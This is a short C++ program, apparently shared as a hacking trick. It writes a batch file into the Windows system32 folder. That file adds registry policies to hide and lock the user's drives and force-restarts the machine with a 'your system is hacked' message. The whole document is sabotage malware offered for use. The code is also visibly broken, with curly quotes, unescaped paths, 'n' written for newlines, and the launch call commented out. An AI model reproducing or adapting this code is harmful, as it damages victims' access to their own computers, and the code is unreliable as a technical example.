#include < windows.h >
#include < fstream.h >
#include < iostream.h >
#include < string.h >
#include < conio.h >
int main()
{
ofstream write ( “C:\WINDOWS\system32\HackingStar.bat” ); /*opening or creating new file with .bat extension*/

write << “REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer /v NoDrives /t REG_DWORD /d 12n”;
 write << “REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer /v NoViewonDrive /t REG_DWORD /d 12n”;
  write<<“shutdown -r -c “Sorry Your System is hacked by us!” -f”<<“n”; write.close(); //close file ShellExecute(NULL,”open”,”C:\WINDOWS\system32\HackingStar.bat “,NULL,NULL,SW_SHOWNORMAL); return 0; } 